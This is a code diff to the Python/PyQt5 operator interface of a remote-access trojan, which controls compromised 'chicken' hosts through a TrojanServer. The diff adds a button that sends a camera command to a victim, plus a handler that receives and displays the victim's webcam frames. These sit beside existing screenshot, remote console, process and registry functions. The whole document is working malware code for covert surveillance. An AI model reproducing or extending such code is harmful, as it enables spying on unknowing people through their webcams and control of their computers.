@@ -10,6 +10,9 @@ from PyQt5 import QtWidgets
 from PyQt5.QtCore import pyqtSignal, Qt, QSize
 from PyQt5.QtGui import QPixmap, QPalette, QImage
 from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel, QFileDialog, QMessageBox
+import pyaudio
+import wave
+from tqdm import tqdm
 
 from Detail import Ui_Form
 from server import TrojanServer, Chienken
@@ -22,6 +25,7 @@ STD = print
 class DetailMain(QWidget, Ui_Form):
     connectsignal = pyqtSignal()
     pic_signal = pyqtSignal(QPixmap)
+    camera_signal = pyqtSignal(QPixmap)
     consoleSignal = pyqtSignal(str)
     listSignal = pyqtSignal(list)
     pwdSignal = pyqtSignal(str)
@@ -29,7 +33,6 @@ class DetailMain(QWidget, Ui_Form):
     threadSignal = pyqtSignal(dict)
     regsubdirSignal = pyqtSignal(dict)
     regkeyvalueSignal = pyqtSignal(dict)
-    # regstartSignal = pyqtSignal()
     pathSignal = pyqtSignal(str) # 其实是注册表的subkey
 
     def __init__(self, trojanserver=None, ck=0):
@@ -53,7 +56,9 @@ class DetailMain(QWidget, Ui_Form):
         self.connect_button.clicked.connect(self.connectChicken)
         self.connectsignal.connect(self.connected)
         self.get_pic.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d pic"%self.ck))
+        self.get_camera.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d camera"%self.ck))
         self.pic_signal.connect(self.displayPic)
+        self.camera_signal.connect(self.displayCamera)
         self.console_input.returnPressed.connect(self.consoleDisplay)
         self.consoleSignal.connect(self.upConsole)
         self.listSignal.connect(self.displayList)
@@ -117,8 +122,12 @@ class DetailMain(QWidget, Ui_Form):
         # print("position1")
         #qmp = qmp.scaled(new_width, new_height)
             #qmp = qmp.scaled(self.screenwidth, int(size.height()*( self.screenwidth / size.width())))
-        print("position2")
+        # print("position2")
         self.pic_label.setPixmap(qmp)
+
+    def displayCamera(self, qmp:QPixmap):
+        # print("position3")
+        self.camera_label.setPixmap(qmp)
 
     def localWidthChange(self):
         self.screenwidth = self.localwidth.value()
@@ -153,10 +162,25 @@ class DetailMain(QWidget, Ui_Form):
                         body = self.tcpPieceRecv(pic_len, self.socket, 1024)
                         try:
                             im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
-                            print(type(im))
+                            # print(type(im))
                             self.pic_signal.emit(ImageQt.toqpixmap(im))
                         except:
                             STD("图片错误")
+                    
+                    elif ty == "camera_im":
+                        d = self.socket.recv(12)
+                        data = struct.unpack('iii', d)
+                        width, height, pic_len = data
+                        picmessage = "width:"+str(width)+"height:"+str(height)+"pic_len:"+str(pic_len)
+                        print(picmessage)
+                        body = self.tcpPieceRecv(pic_len, self.socket, 1024)
+                        try:
+                            im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
+                            # print(type(im))
+                            self.camera_signal.emit(ImageQt.toqpixmap(im))
+                        except:
+                            STD("图片错误")
+
                     elif ty == "response":
                         res_len = struct.unpack('i', self.socket.recv(4))[0]
                         response = self.socket.recv(res_len)
